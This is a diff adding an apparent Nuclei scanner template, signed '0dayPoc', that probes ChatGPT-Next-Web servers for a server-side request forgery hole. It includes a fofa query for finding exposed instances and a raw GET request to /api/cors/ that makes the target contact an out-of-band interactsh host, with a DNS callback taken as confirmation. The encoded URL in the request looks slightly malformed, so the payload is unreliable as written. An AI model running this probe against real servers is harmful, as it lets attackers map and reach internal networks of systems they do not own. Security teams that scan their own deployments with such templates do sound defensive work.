@@ -1,0 +1,23 @@
+id: chatgpt-next-web-ssrf
+info:
+  name: ChatGPT-Next-Web 服务端请求伪造漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="ChatGPT-Next-Web"
+      该应用存在服务端请求伪造（SSRF）漏洞，攻击者可通过构造恶意请求，诱使服务器向内部网络发起未授权的连接，从而获取敏感信息或进一步渗透内部系统。
+  tags: ChatGPT-Next-Web
+http:
+- raw:
+  - |
+    GET /api/cors/http:%2f%2{{interactsh-url}}%23 HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
